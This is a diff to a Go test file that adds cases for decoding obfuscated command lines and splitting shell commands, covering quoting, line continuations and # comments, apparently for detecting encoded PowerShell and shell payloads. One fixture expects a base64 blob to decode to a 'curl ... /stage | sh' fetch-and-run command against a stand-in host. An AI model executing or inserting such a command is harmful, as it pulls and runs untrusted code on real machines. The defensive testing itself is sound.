@@ -74,6 +74,11 @@ func TestDecodeCommandLine(t *testing.T) {
 		{"sh reads a doubled backslash inside double quotes as one, which then escapes the operator", `/bin/sh -c "echo \\; pwsh -e ZQBjAGgAbwA="`, "", ""},
 		{"sh reads four backslashes inside double quotes as two, so the operator stands", `/bin/sh -c "echo \\\\; pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
 		{"sh reads a doubled backslash outside quotes as one", `/bin/sh -c echo\\;pwsh\ -e\ ZQBjAGgAbwA=`, "", ""},
+		{"sh joins a backslash-newline inside double quotes, so a wrapped switch reads whole", "/bin/sh -c \"pwsh -en\\\nc ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
+		{"sh joins a backslash-newline between words", "/bin/sh -c \"pwsh -nop \\\n-e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
+		{"sh reads # opening a word as a comment to the end of the line, operators included", `/bin/sh -c "echo # && pwsh -e ZQBjAGgAbwA="`, "", ""},
+		{"a # inside a word is text", `/bin/sh -c "echo a#b && pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
+		{"a line continuation vanishes before # is read, so the comment holds", "/bin/echo \\\n# && pwsh -e ZQBjAGgAbwA=", "", ""},
 		{"an empty flagged token flags nothing, so a shell blob on the line still decodes", `powershell -e "" & sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
 		{"sh escapes a quote inside double quotes, so the operator is data", `/bin/sh -c "echo \"a & pwsh -e ZQBjAGgAbwA=\""`, "", ""},
 		{"an escaped space in a POSIX path", `/opt/my\ tools/pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
@@ -237,6 +242,9 @@ func TestSplitCommands(t *testing.T) {
 		{`echo "a & b" ; echo 'c ; d' \; e`, posixShell, []string{`echo "a & b"`, `echo 'c ; d' \; e`}},
 		{`echo "a \" & b" ; c`, posixShell, []string{`echo "a \" & b"`, `c`}},
 		{`cmd /c echo \"x & y`, windowsShell, []string{`cmd /c echo \"x & y`}},
+		{"echo \\\n# a && b", posixShell, []string{"echo \\"}}, // the text stays verbatim; tokenize removes the continuation
+		{"echo a#b | c # d | e", posixShell, []string{"echo a#b", "c"}},
+		{"echo a # b & c", windowsShell, []string{"echo a # b", "c"}},
 		{``, windowsShell, nil},
 	}
 	for _, c := range cases {
